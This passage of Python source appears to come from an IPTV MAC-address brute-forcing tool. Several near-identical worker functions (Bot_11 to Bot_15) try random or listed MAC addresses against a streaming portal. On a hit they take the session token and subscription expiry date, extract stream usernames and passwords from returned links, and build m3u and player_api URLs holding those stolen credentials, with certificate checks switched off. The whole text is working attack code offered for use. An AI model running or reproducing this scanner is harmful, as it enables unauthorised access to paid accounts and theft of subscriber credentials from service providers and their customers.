                                livelist=""
                                vodlist=""
                                serieslist=""
                                if kanalkata=="1" or kanalkata=="2":
                                        listlink=liveurl
                                        livel=' «⭐️» '
                                        livelist=list(listlink,macs,token,livel)
                                if kanalkata=="2":
                                        listlink=vodurl
                                        livel=' «💥️» '
                                        vodlist=list(listlink,macs,token,livel)
                                        listlink=seriesurl
                                        livel=' «⚡️️» '
                                        serieslist=list(listlink,macs,token,livel)
                                hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC,kanalsayisi,filmsayisi,dizisayisi)

def d11():
        global hitc
        global hitr
        global tokenr
        for mac in range(11,uz,botsay):
                total=mac
                if dsyno=="0":
                        mac=randommac()
                else:
                        macv=re.search(pattern,totLen[mac],re.IGNORECASE)
                        if macv:
                                mac=macv.group()
                        else:
                                continue
                macs=mac.upper().replace(':','%3A')
                bot="Bot_11"
                oran=""
                oran=round(((total)/(uz)*100),2)
                echok(mac,bot,total,hitc,oran,tokenr)
                bag=0
                while True:
                        try:
                                res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
                                veri=str(res.text)
                                break
                        except:
                                bag=bag+1
                                time.sleep(1)
                                if bag==12:
                                        break
                tokenr="\33[35m"
                if 'token' in veri:
                        tokenr="\33[1m"
                        token=veri.replace('{"js":{"token":"',"")
                        token=token.split('"')[0]
                        bag=0
                        while True:
                           try:
                             res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
                             veri=""
                             veri=str(res.text)
                             break
                           except:
                                bag=bag+1
                                time.sleep(1)
                                if bag==12:
                                        break
                        id="null"
                        ip=""
                        try:
                             id=veri.split('{"js":{"id":')[1]
                             id=id.split(',"name')[0]
                             ip=veri.split('ip":"')[1]
                             ip=ip.split('"')[0]
                        except:pass
                        if not id=="null":
                            bag=0
                            while True:
                                try:
                                        res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
                                        veri=""
                                        veri=str(res.text)
                                        break
                                except:
                                        bag=bag+1
                                        time.sleep(1)
                                        if bag==12:
                                                break
                            if not veri.count('phone')==0:
                                hitr="\33[1;36m"
                                hitc=hitc+1
                                trh=""
                                if 'end_date' in veri:
                                        trh=veri.split('end_date":"')[1]
                                        trh=trh.split('"')[0]
                                else:
                                          try:
                                              trh=veri.split('phone":"')[1]
                                              trh=trh.split('"')[0]
                                              if trh.lower()[:2] =='un':
                                                KalanGun=(" Days")
                                              else:
                                                KalanGun=(str(tarih_clear(trh))+" Days")
                                                trh=trh+' '+ KalanGun
                                          except:pass
                                hitprint(mac,trh)
                                bag=0
                                while True:
                                        try:
                                                res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
                                                veri=""
                                                veri=str(res.text)
                                                cid=""
                                                cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
                                                break
                                        except:
                                                bag=bag+1
                                                time.sleep(1)
                                                if bag==10:
                                                        #quit()
                                                        cid="94067"
                                                        break
                                real=panel
                                m3ulink=""
                                user=""
                                pas=""
                                durum="Invalid Opps"
                                bag=0
                                while True:
                                        try:
                                                res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
                                                veri=""
                                                veri=str(res.text)
                                                link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
                                                real='http://'+link.split('://')[1].split('/')[0]
                                                user=str(link.replace('live/','').split('/')[3])
                                                pas=str(link.replace('live/','').split('/')[4])
                                                m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
                                                durum=goruntu(link)
                                                break
                                        except:
                                                bag=bag+1
                                                time.sleep(1)
                                                if bag==12:
                                                        break
                                playerapi=""
                                if not m3ulink=="":
                                        playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                                        playerapi=m3uapi(playerlink,macs,token)
                                        if playerapi=="":
                                                playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                                                playerapi=m3uapi(playerlink,macs,token)

                                SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
                                SNENC=SN.upper()
                                SNCUT=SNENC[:13]
                                DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
                                DEVENC=DEV.upper()
                                SG=SNCUT+'+'+(mac)
                                SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
                                SINGENC=SING.upper()

                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_live_streams"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break

                                bag1=0
                                veri=str(res.text)
                                kanalsayisi=str(veri.count("stream_id"))
                                #print(kanalsayisi)
                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_vod_streams"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break
                                bag1=0
                                veri=str(res.text)
                                filmsayisi=str(veri.count("stream_id"))
                
                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_series"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break
                                bag1=0
                                veri=str(res.text)
                                dizisayisi=str(veri.count("series_id"))

                                vpn=""
                                if not ip =="":
                                        vpn=vpnip(ip)
                                else:
                                        vpn="ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ ᴀᴅᴅʀᴇꜱꜱ"
                                livelist=""
                                vodlist=""
                                serieslist=""
                                if kanalkata=="1" or kanalkata=="2":
                                        listlink=liveurl
                                        livel=' «⭐️» '
                                        livelist=list(listlink,macs,token,livel)
                                if kanalkata=="2":
                                        listlink=vodurl
                                        livel=' «💥️» '
                                        vodlist=list(listlink,macs,token,livel)
                                        listlink=seriesurl
                                        livel=' «⚡️️» '
                                        serieslist=list(listlink,macs,token,livel)
                                hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC,kanalsayisi,filmsayisi,dizisayisi)

def d12():
        global hitc
        global hitr
        global tokenr
        for mac in range(12,uz,botsay):
                total=mac
                if dsyno=="0":
                        mac=randommac()
                else:
                        macv=re.search(pattern,totLen[mac],re.IGNORECASE)
                        if macv:
                                mac=macv.group()
                        else:
                                continue
                macs=mac.upper().replace(':','%3A')
                bot="Bot_12"
                oran=""
                oran=round(((total)/(uz)*100),2)
                echok(mac,bot,total,hitc,oran,tokenr)
                bag=0
                while True:
                        try:
                                res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
                                veri=str(res.text)
                                break
                        except:
                                bag=bag+1
                                time.sleep(1)
                                if bag==12:
                                        break
                tokenr="\33[35m"
                if 'token' in veri:
                        tokenr="\33[1m"
                        token=veri.replace('{"js":{"token":"',"")
                        token=token.split('"')[0]
                        bag=0
                        while True:
                           try:
                             res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
                             veri=""
                             veri=str(res.text)
                             break
                           except:
                                bag=bag+1
                                time.sleep(1)
                                if bag==12:
                                        break
                        id="null"
                        ip=""
                        try:
                             id=veri.split('{"js":{"id":')[1]
                             id=id.split(',"name')[0]
                             ip=veri.split('ip":"')[1]
                             ip=ip.split('"')[0]
                        except:pass
                        if not id=="null":
                            bag=0
                            while True:
                                try:
                                        res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
                                        veri=""
                                        veri=str(res.text)
                                        break
                                except:
                                        bag=bag+1
                                        time.sleep(1)
                                        if bag==12:
                                                break
                            if not veri.count('phone')==0:
                                hitr="\33[1;36m"
                                hitc=hitc+1
                                trh=""
                                if 'end_date' in veri:
                                        trh=veri.split('end_date":"')[1]
                                        trh=trh.split('"')[0]
                                else:
                                          try:
                                              trh=veri.split('phone":"')[1]
                                              trh=trh.split('"')[0]
                                              if trh.lower()[:2] =='un':
                                                KalanGun=(" Days")
                                              else:
                                                KalanGun=(str(tarih_clear(trh))+" Days")
                                                trh=trh+' '+ KalanGun
                                          except:pass
                                hitprint(mac,trh)
                                bag=0
                                while True:
                                        try:
                                                res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
                                                veri=""
                                                veri=str(res.text)
                                                cid=""
                                                cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
                                                break
                                        except:
                                                bag=bag+1
                                                time.sleep(1)
                                                if bag==10:
                                                        #quit()
                                                        cid="94067"
                                                        break
                                real=panel
                                m3ulink=""
                                user=""
                                pas=""
                                durum="Invalid Opps"
                                bag=0
                                while True:
                                        try:
                                                res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
                                                veri=""
                                                veri=str(res.text)
                                                link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
                                                real='http://'+link.split('://')[1].split('/')[0]
                                                user=str(link.replace('live/','').split('/')[3])
                                                pas=str(link.replace('live/','').split('/')[4])
                                                m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
                                                durum=goruntu(link)
                                                break
                                        except:
                                                bag=bag+1
                                                time.sleep(1)
                                                if bag==12:
                                                        break
                                playerapi=""
                                if not m3ulink=="":
                                        playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                                        playerapi=m3uapi(playerlink,macs,token)
                                        if playerapi=="":
                                                playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                                                playerapi=m3uapi(playerlink,macs,token)

                                SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
                                SNENC=SN.upper()
                                SNCUT=SNENC[:13]
                                DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
                                DEVENC=DEV.upper()
                                SG=SNCUT+'+'+(mac)
                                SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
                                SINGENC=SING.upper()

                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_live_streams"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break

                                bag1=0
                                veri=str(res.text)
                                kanalsayisi=str(veri.count("stream_id"))
                                #print(kanalsayisi)
                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_vod_streams"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break
                                bag1=0
                                veri=str(res.text)
                                filmsayisi=str(veri.count("stream_id"))
                
                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_series"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break
                                bag1=0
                                veri=str(res.text)
                                dizisayisi=str(veri.count("series_id"))
                                        
                                url9="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_series"
                                while True:
                                                try:
                                                        res = ses.get(url9, headers=hea2(macs,token), timeout=15, verify=False)
                                                        break
                                                except:pass
                                                        #bag1=bag1+1
#                                                       time.sleep(bekleme)
#                                                       if bag1==4:
#                                                               break
                                bag1=0
                                veri=str(res.text)
                                dizisayisi=str(veri.count("series_id"))

                                vpn=""
                                if not ip =="":
                                        vpn=vpnip(ip)
                                else:
                                        vpn="ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ ᴀᴅᴅʀᴇꜱꜱ"
                                livelist=""
                                vodlist=""
                                serieslist=""
                                if kanalkata=="1" or kanalkata=="2":
                                        listlink=liveurl
                                        livel=' «⭐️» '
                                        livelist=list(listlink,macs,token,livel)
                                if kanalkata=="2":
                                        listlink=vodurl
                                        livel=' «💥️» '
                                        vodlist=list(listlink,macs,token,livel)
                                        listlink=seriesurl
                                        livel=' «⚡️️» '
                                        serieslist=list(listlink,macs,token,livel)
                                hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC,kanalsayisi,filmsayisi,dizisayisi)

def d13():
        global hitc
        global hitr
        global tokenr
        for mac in range(13,uz,botsay):
                total=mac
                if dsyno=="0":
                        mac=randommac()
                else:
                        macv=re.search(pattern,totLen[mac],re.IGNORECASE)
                        if macv:
                                mac=macv.group()
                        else:
                                continue
                macs=mac.upper().replace(':','%3A')
                bot="Bot_13"
                oran=""
                oran=round(((total)/(uz)*100),2)
                echok(mac,bot,total,hitc,oran,tokenr)
                bag=0
                while True:
                        try:
                                res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
                                veri=str(res.text)
                                break
                        except:
                                bag=bag+1
                                time.sleep(1)
                                if bag==12:
                                        break
                tokenr="\33[35m"
                if 'token' in veri:
                        tokenr="\33[1m"
                        token=veri.replace('{"js":{"token":"',"")
                        token=token.split('"')[0]
                        bag=0
                        while True:
                           try:
                             res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
                             veri=""
                             veri=str(res.text)
                             break
                           except:
                                bag=bag+1
                                time.sleep(1)
                                if bag==12:
                                        break
                        id="null"
                        ip=""
                        try:
                             id=veri.split('{"js":{"id":')[1]
                             id=id.split(',"name')[0]
                             ip=veri.split('ip":"')[1]
                             ip=ip.split('"')[0]
                        except:pass
                        if not id=="null":
                            bag=0
                            while True:
                                try:
                                        res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
                                        veri=""
                                        veri=str(res.text)
                                        break
                                except:
                                        bag=bag+1
                                        time.sleep(1)
                                        if bag==12:
                                                break
                            if not veri.count('phone')==0:
                                hitr="\33[1;36m"
                                hitc=hitc+1
                                trh=""
                                if 'end_date' in veri:
                                        trh=veri.split('end_date":"')[1]
                                        trh=trh.split('"')[0]
                                else:
                                          try:
                                              trh=veri.split('phone":"')[1]
                                              trh=trh.split('"')[0]
                                              if trh.lower()[:2] =='un':
                                                KalanGun=(" Days")
                                              else:
                                                KalanGun=(str(tarih_clear(trh))+" Days")
                                                trh=trh+' '+ KalanGun
                                          except:pass
                                hitprint(mac,trh)
                                bag=0
                                while True:
                                        try:
                                                res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
                                                veri=""
                                                veri=str(res.text)
                                                cid=""
                                                cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
                                                break
                                        except:
                                                bag=bag+1
                                                time.sleep(1)
                                                if bag==10:
                                                        #quit()
                                                        cid="94067"
                                                        break
                                real=panel
                                m3ulink=""
                                user=""
                                pas=""
                                durum="Invalid Opps"
                                bag=0
                                while True:
                                        try:
                                                res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
                                                veri=""
                                                veri=str(res.text)
                                                link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
                                                real='http://'+link.split('://')[1].split('/')[0]
                                                user=str(link.replace('live/','').split('/')[3])
                                                pas=str(link.replace('live/','').split('/')[4])
                                                m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
                                                durum=goruntu(link)
                                                break
                                        except:
                                                bag=bag+1
                                                time.sleep(1)
                                                if bag==12:
                                                        break
                                playerapi=""
                                if not m3ulink=="":
                                        playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                                        playerapi=m3uapi(playerlink,macs,token)
                                        if playerapi=="":
                                                playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                                                playerapi=m3uapi(playerlink,macs,token)
                                        if playerapi=="":
                                                playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                                                playerapi=m3uapi(playerlink,macs,token)

                                SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
                                SNENC=SN.upper()
                                SNCUT=SNENC[:13]
                                DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
                                DEVENC=DEV.upper()
                                SG=SNCUT+'+'+(mac)
                                SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
                                SINGENC=SING.upper()

                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_live_streams"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break

                                bag1=0
                                veri=str(res.text)
                                kanalsayisi=str(veri.count("stream_id"))
                                #print(kanalsayisi)
                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_vod_streams"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break
                                bag1=0
                                veri=str(res.text)
                                filmsayisi=str(veri.count("stream_id"))
                
                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_series"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break
                                bag1=0
                                veri=str(res.text)
                                dizisayisi=str(veri.count("series_id"))

                                vpn=""
                                if not ip =="":
                                        vpn=vpnip(ip)
                                else:
                                        vpn="ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ ᴀᴅᴅʀᴇꜱꜱ"
                                livelist=""
                                vodlist=""
                                serieslist=""
                                if kanalkata=="1" or kanalkata=="2":
                                        listlink=liveurl
                                        livel=' «⭐️» '
                                        livelist=list(listlink,macs,token,livel)
                                if kanalkata=="2":
                                        listlink=vodurl
                                        livel=' «💥️» '
                                        vodlist=list(listlink,macs,token,livel)
                                        listlink=seriesurl
                                        livel=' «⚡️️» '
                                        serieslist=list(listlink,macs,token,livel)
                                hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC,kanalsayisi,filmsayisi,dizisayisi)

def d14():
        global hitc
        global hitr
        global tokenr
        for mac in range(14,uz,botsay):
                total=mac
                if dsyno=="0":
                        mac=randommac()
                else:
                        macv=re.search(pattern,totLen[mac],re.IGNORECASE)
                        if macv:
                                mac=macv.group()
                        else:
                                continue
                macs=mac.upper().replace(':','%3A')
                bot="Bot_14"
                oran=""
                oran=round(((total)/(uz)*100),2)
                echok(mac,bot,total,hitc,oran,tokenr)
                bag=0
                while True:
                        try:
                                res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
                                veri=str(res.text)
                                break
                        except:
                                bag=bag+1
                                time.sleep(1)
                                if bag==12:
                                        break
                tokenr="\33[35m"
                if 'token' in veri:
                        tokenr="\33[1m"
                        token=veri.replace('{"js":{"token":"',"")
                        token=token.split('"')[0]
                        bag=0
                        while True:
                           try:
                             res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
                             veri=""
                             veri=str(res.text)
                             break
                           except:
                                bag=bag+1
                                time.sleep(1)
                                if bag==12:
                                        break
                        id="null"
                        ip=""
                        try:
                             id=veri.split('{"js":{"id":')[1]
                             id=id.split(',"name')[0]
                             ip=veri.split('ip":"')[1]
                             ip=ip.split('"')[0]
                        except:pass
                        if not id=="null":
                            bag=0
                            while True:
                                try:
                                        res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
                                        veri=""
                                        veri=str(res.text)
                                        break
                                except:
                                        bag=bag+1
                                        time.sleep(1)
                                        if bag==12:
                                                break
                            if not veri.count('phone')==0:
                                hitr="\33[1;36m"
                                hitc=hitc+1
                                trh=""
                                if 'end_date' in veri:
                                        trh=veri.split('end_date":"')[1]
                                        trh=trh.split('"')[0]
                                else:
                                          try:
                                              trh=veri.split('phone":"')[1]
                                              trh=trh.split('"')[0]
                                              if trh.lower()[:2] =='un':
                                                KalanGun=(" Days")
                                              else:
                                                KalanGun=(str(tarih_clear(trh))+" Days")
                                                trh=trh+' '+ KalanGun
                                          except:pass
                                hitprint(mac,trh)
                                bag=0
                                while True:
                                        try:
                                                res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
                                                veri=""
                                                veri=str(res.text)
                                                cid=""
                                                cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
                                                break
                                        except:
                                                bag=bag+1
                                                time.sleep(1)
                                                if bag==10:
                                                        #quit()
                                                        cid="94067"
                                                        break
                                real=panel
                                m3ulink=""
                                user=""
                                pas=""
                                durum="Invalid Opps"
                                bag=0
                                while True:
                                        try:
                                                res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
                                                veri=""
                                                veri=str(res.text)
                                                link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
                                                real='http://'+link.split('://')[1].split('/')[0]
                                                user=str(link.replace('live/','').split('/')[3])
                                                pas=str(link.replace('live/','').split('/')[4])
                                                m3ulink="http://"+ real.replace('http://','').replace('/c/','') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
                                                durum=goruntu(link)
                                                break
                                        except:
                                                bag=bag+1
                                                time.sleep(1)
                                                if bag==12:
                                                        break
                                playerapi=""
                                if not m3ulink=="":
                                        playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                                        playerapi=m3uapi(playerlink,macs,token)
                                        if playerapi=="":
                                                playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                                                playerapi=m3uapi(playerlink,macs,token)

                                SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
                                SNENC=SN.upper()
                                SNCUT=SNENC[:13]
                                DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
                                DEVENC=DEV.upper()
                                SG=SNCUT+'+'+(mac)
                                SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
                                SINGENC=SING.upper()

                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_live_streams"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break

                                bag1=0
                                veri=str(res.text)
                                kanalsayisi=str(veri.count("stream_id"))
                                #print(kanalsayisi)
                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_vod_streams"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break
                                bag1=0
                                veri=str(res.text)
                                filmsayisi=str(veri.count("stream_id"))
                
                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_series"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break
                                bag1=0
                                veri=str(res.text)
                                dizisayisi=str(veri.count("series_id"))

                                vpn=""
                                if not ip =="":
                                        vpn=vpnip(ip)
                                else:
                                        vpn="ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ ᴀᴅᴅʀᴇꜱꜱ"
                                livelist=""
                                vodlist=""
                                serieslist=""
                                if kanalkata=="1" or kanalkata=="2":
                                        listlink=liveurl
                                        livel=' «⭐️» '
                                        livelist=list(listlink,macs,token,livel)
                                if kanalkata=="2":
                                        listlink=vodurl
                                        livel=' «💥️» '
                                        vodlist=list(listlink,macs,token,livel)
                                        listlink=seriesurl
                                        livel=' «⚡️️» '
                                        serieslist=list(listlink,macs,token,livel)
                                hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC,kanalsayisi,filmsayisi,dizisayisi)

def d15():
        global hitc
        global hitr
        global tokenr
        for mac in range(15,uz,botsay):
                total=mac
                if dsyno=="0":
                        mac=randommac()
                else:
                        macv=re.search(pattern,totLen[mac],re.IGNORECASE)
                        if macv:
                                mac=macv.group()
                        else:
                                continue
                macs=mac.upper().replace(':','%3A')
                bot="Bot_15"
                oran=""
                oran=round(((total)/(uz)*100),2)
                echok(mac,bot,total,hitc,oran,tokenr)
                bag=0
                while True:
                        try:
                                res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
                                veri=str(res.text)
                                break
                        except:
                                bag=bag+1
                                time.sleep(1)
                                if bag==12:
                                        break
                tokenr="\33[35m"
                if 'token' in veri:
                        tokenr="\33[1m"
                        token=veri.replace('{"js":{"token":"',"")
                        token=token.split('"')[0]
                        bag=0
                        while True:
                           try:
                             res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
                             veri=""
                             veri=str(res.text)
                             break
                           except:
                                bag=bag+1
                                time.sleep(1)
                                if bag==12:
                                        break
                        id="null"
                        ip=""
                        try:
                             id=veri.split('{"js":{"id":')[1]
                             id=id.split(',"name')[0]
                             ip=veri.split('ip":"')[1]
                             ip=ip.split('"')[0]
                        except:pass
                        if not id=="null":
                            bag=0
                            while True:
                                try:
                                        res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
                                        veri=""
                                        veri=str(res.text)
                                        break
                                except:
                                        bag=bag+1
                                        time.sleep(1)
                                        if bag==12:
                                                break
                            if not veri.count('phone')==0:
                                hitr="\33[1;36m"
                                hitc=hitc+1
                                trh=""
                                if 'end_date' in veri:
                                        trh=veri.split('end_date":"')[1]
                                        trh=trh.split('"')[0]
                                else:
                                          try:
                                              trh=veri.split('phone":"')[1]
                                              trh=trh.split('"')[0]
                                              if trh.lower()[:2] =='un':
                                                KalanGun=(" Days")
                                              else:
                                                KalanGun=(str(tarih_clear(trh))+" Days")
                                                trh=trh+' '+ KalanGun
                                          except:pass
                                hitprint(mac,trh)
                                bag=0
                                while True:
                                        try:
                                                res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
                                                veri=""
                                                veri=str(res.text)
                                                cid=""
                                                cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
                                                break
                                        except:
                                                bag=bag+1
                                                time.sleep(1)
                                                if bag==10:
                                                        #quit()
                                                        cid="94067"
                                                        break
                                real=panel
                                m3ulink=""
                                user=""
                                pas=""
                                durum="Invalid Opps"
                                bag=0
                                while True:
                                        try:
                                                res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
                                                veri=""
                                                veri=str(res.text)
                                                link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
                                                real='http://'+link.split('://')[1].split('/')[0]
                                                user=str(link.replace('live/','').split('/')[3])
                                                pas=str(link.replace('live/','').split('/')[4])
                                                m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
                                                durum=goruntu(link)
                                                break
                                        except:
                                                bag=bag+1
                                                time.sleep(1)
                                                if bag==12:
                                                        break
                                playerapi=""
                                if not m3ulink=="":
                                        playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                                        playerapi=m3uapi(playerlink,macs,token)
                                        if playerapi=="":
                                                playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                                                playerapi=m3uapi(playerlink,macs,token)

                                SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
                                SNENC=SN.upper()
                                SNCUT=SNENC[:13]
                                DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
                                DEVENC=DEV.upper()
                                SG=SNCUT+'+'+(mac)
                                SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
                                SINGENC=SING.upper()

                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_live_streams"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break

                                bag1=0
                                veri=str(res.text)
                                kanalsayisi=str(veri.count("stream_id"))
                                #print(kanalsayisi)
                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_vod_streams"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break
                                bag1=0
                                veri=str(res.text)
                                filmsayisi=str(veri.count("stream_id"))
                
                                url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_series"
                                while True:
                                                        try:
                                                                res = ses.get(url10, headers=hea2(macs,token), timeout=15, verify=False)
                                                                break
                                                        except:
                                                                bag1=bag1+1
                                                                time.sleep(2)
                                                                if bag1==4:
                                                                        break
                                bag1=0
                                veri=str(res.text)
